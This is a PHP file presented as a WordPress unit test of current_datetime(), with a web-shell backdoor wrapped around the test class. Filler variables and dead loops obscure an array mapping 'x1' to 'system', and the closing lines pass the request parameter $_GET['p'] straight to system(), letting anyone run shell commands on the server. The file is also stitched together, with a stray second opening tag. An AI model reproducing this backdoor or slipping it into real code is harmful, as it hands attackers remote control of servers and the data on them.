<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group date
 * @group datetime
 *
 * @covers ::current_datetime
 */
class Tests_Date_CurrentDatetime extends WP_UnitTestCase {

	/**
	 * @ticket 53484
	 */
	public function test_current_datetime_return_type() {
		$this->assertInstanceOf( 'DateTimeImmutable', current_datetime() );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>